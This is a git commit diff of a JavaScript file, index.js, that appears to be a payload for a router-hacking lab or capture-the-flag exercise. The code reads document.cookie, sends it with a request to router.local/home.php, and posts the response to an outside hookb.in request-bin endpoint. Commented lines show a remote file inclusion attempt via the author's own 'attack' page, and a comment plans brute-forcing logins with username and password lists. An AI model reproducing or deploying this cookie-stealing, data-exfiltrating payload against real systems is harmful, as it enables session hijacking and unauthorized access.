b959b76494720799a1b16695589b3e7f7c29915e
nastassiagoodson <60201494+nastassiagoodson@users.noreply.github.com>
2022-03-07 10:35:06 -0800

    Update index.js

--- index.js
+++ index.js
@@ -1,15 +1,18 @@
+//figure out how to login more automatically (e.g. for loops with all usernames/passwords + sending requests with each of them
+
 const http = new XMLHttpRequest();
 //http.open('POST', 'http://router.local/login.php', true);
-//http://router.local/home.php?action=view&
+//'http://router.local/home.php?action=view&'+cook -> what we http.responseURL if successful login
 //http://router.local/view.php
 const cook = document.cookie;
-http.open('POST', 'http://router.local/home.php?action=http://nastassiagoodson.github.io/attack&'+cook, true);
+//http.open('POST', 'http://router.local/home.php?action=http://nastassiagoodson.github.io/attack&'+cook, true); -> how to run own php code (e.g. ls)
+http.open('POST', 'http://router.local/home.php?action=setup&'+cook, true);
 
 http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
 http.onload = function () {
                 const xhr = new XMLHttpRequest();
-                xhr.open('POST', 'https://hookb.in/YV0MqeVpzGhQERGGd0Bn', true);
+                xhr.open('POST', 'https://hookb.in/NOrwgEmDKjte8mNNl6Nd', true);
                 xhr.setRequestHeader('Content-type', 'application/json');
                 xhr.send(JSON.stringify(http.response));
 
